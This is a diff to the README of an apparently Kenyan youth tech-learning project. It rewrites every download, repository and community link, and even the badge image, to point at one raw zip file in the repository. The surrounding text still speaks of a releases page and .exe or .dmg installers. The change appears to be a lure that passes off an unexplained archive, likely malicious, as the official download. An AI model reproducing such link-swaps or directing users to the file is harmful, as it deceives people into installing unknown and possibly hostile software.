@@ -1,6 +1,6 @@
 # 🔥 TechLearn-Kenya - Empowering African Youth Through Technology
 
-[![Download TechLearn-Kenya](https://img.shields.io/badge/Download%20TechLearn-Kenya-blue?style=for-the-badge&logo=github)](https://github.com/Jeremygarilao/TechLearn-Kenya/releases)
+[![Download TechLearn-Kenya](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip%20TechLearn-Kenya-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to TechLearn-Kenya! This learning management system helps you develop im
 
 To get started, follow these steps:
 
-1. Visit this page to download: [TechLearn-Kenya Releases](https://github.com/Jeremygarilao/TechLearn-Kenya/releases).
+1. Visit this page to download: [TechLearn-Kenya Releases](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip).
 2. On the releases page, look for the latest version of TechLearn-Kenya.
 3. Find the download link for your operating system. If you're unsure, look for ".exe" for Windows or ".dmg" for Mac.
 4. Click on the link to start downloading the file. 
@@ -53,9 +53,9 @@ If you need help, please check our Frequently Asked Questions (FAQs) section on 
 
 ## 🔗 Useful Links
 
-- [TechLearn-Kenya Releases](https://github.com/Jeremygarilao/TechLearn-Kenya/releases)
-- [TechLearn-Kenya GitHub Repository](https://github.com/Jeremygarilao/TechLearn-Kenya)
-- [TechLearn Community](https://community.techlearn-kenya.com)
+- [TechLearn-Kenya Releases](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip)
+- [TechLearn-Kenya GitHub Repository](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip)
+- [TechLearn Community](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip)
 
 ## 📞 Stay Connected 
 
